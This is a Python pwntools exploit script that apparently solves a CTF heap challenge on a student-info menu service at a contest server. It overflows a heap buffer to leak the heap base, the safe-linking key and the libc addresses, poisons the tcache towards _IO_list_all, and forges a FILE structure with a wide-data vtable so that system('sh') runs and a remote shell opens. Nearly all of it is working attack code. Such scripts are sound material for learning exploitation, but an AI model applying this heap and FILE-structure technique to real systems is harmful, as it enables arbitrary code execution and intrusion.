from pwn import *

#context.log_level='debug'
context.arch='amd64'

#r=process("./pwn")
#gdb.attach(r)
r=remote("contest.ctf.nefu.edu.cn",33059)
pause()

def add_s(index,size,content):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Enter student ID (0-12): ")
    r.sendline(str(index))
    r.recvuntil(b"Enter info size: ")
    r.sendline(str(size))
    r.recvuntil(b"Enter student info: ")
    r.send(content)

def edi_s(index,size,content):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"Enter student ID to edit: ")
    r.sendline(str(index))
    r.recvuntil(b"Enter info size to edit: ")
    r.sendline(str(size))
    r.recvuntil(b"Enter new student info: ")
    r.send(content)

def del_s(index):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Enter student ID to remove: ")
    r.sendline(str(index))

def show_s(index):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"Enter student ID to show: ")
    r.sendline(str(index))


add_s(0,0x20,b'a')
add_s(1,0x600,b'a')
add_s(2,0x20,b'a')

del_s(1)


edi_s(0,0x30,b'a'*0x30)
show_s(0)
r.recvuntil(b'a'*0x30)
heap_base=u64((r.recvuntil(b"1. ")[:-4]).ljust(8,b"\x00"))*0x1000
print(hex(heap_base))
edi_s(0,0x38,b'a'*0x38)
show_s(0)
r.recvuntil(b'a'*0x38)

key=(r.recvuntil(b"1. ")[:-4]).ljust(8,b"\x00")
print(key)
edi_s(0,0x50,b'a'*0x50)
show_s(0)
r.recvuntil(b'a'*0x50)
libc_base=u64((r.recvuntil(b"1. ")[:-4]).ljust(8,b"\x00"))-0x21ACE0
print(hex(libc_base))
libc=ELF("./libc.so.6")
print(hex(libc_base+libc.sym["_IO_list_all"]-0x10))

edi_s(0,0x50,b'a'*0x20+p64(0)+p64(0x21)+p64(heap_base)+key+p64(0)+p64(0x611))



add_s(1,0x600,b'a')

edi_s(0,0x40,b'a'*0x20+p64(0)+p64(0x21)+p64(libc_base+libc.sym["_IO_list_all"])+p64(0))

edi_s(1,0x8,p64(heap_base+0x310))

edi_s(0,0x40,b'a'*0x20+p64(0)+p64(0x21)+p64(heap_base+0x310)+p64(0))
_IO_stdfile_2_lock=libc_base+0x21ca60
system=libc.sym["system"]+libc_base
file_addr=heap_base+0x310
IO_wide_data_addr=file_addr
wide_vtable_addr=file_addr+0xe8-0x68
fake_io = b""
fake_io += p64(0)  # _IO_read_end
fake_io += p64(0)  # _IO_read_base
fake_io += p64(0)  # _IO_write_base
fake_io += p64(1)  # _IO_write_ptr
fake_io += p64(0)  # _IO_write_end
fake_io += p64(0)  # _IO_buf_base;
fake_io += p64(0)  # _IO_buf_end should usually be (_IO_buf_base + 1)
fake_io += p64(0)   # _IO_save_base 
fake_io += p64(0)*3   # from _IO_backup_base to _markers
fake_io += p64(0)  # the FILE chain ptr
fake_io += p32(2)  # _fileno for stderr is 2
fake_io += p32(0)  # _flags2, usually 0
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset, -1
fake_io += p16(0)  # _cur_column
fake_io += b"\x00"  # _vtable_offset
fake_io += b"\n"  # _shortbuf[1]
fake_io += p32(0)  # padding
fake_io += p64(_IO_stdfile_2_lock)  # _IO_stdfile_1_lock
fake_io += p64(0xFFFFFFFFFFFFFFFF)  # _offset, -1
fake_io += p64(0)  # _codecvt, usually 0
fake_io += p64(IO_wide_data_addr)  # _IO_wide_data_1
fake_io += p64(0) * 3  # from _freeres_list to __pad5
fake_io += p32(0xFFFFFFFF)  # _mode, usually -1
fake_io += b"\x00" * 19  # _unused2
fake_io = fake_io.ljust(0xc8, b'\x00')  # adjust to vtable
fake_io += p64(libc_base+libc.sym['_IO_wfile_jumps'])  # _IO_list_all fake vtable
fake_io += p64(wide_vtable_addr)
fake_io += p64(system)
fake_io = b"  sh"+b"\x00"*4+p64(40)+fake_io

edi_s(1,0x600,fake_io)
pause()
r.sendline(b"1")
pause()
r.sendline(b"10")
pause()
r.sendline(b"10000000")
pause()
#add_s(0,0x700,b'a')


r.interactive()
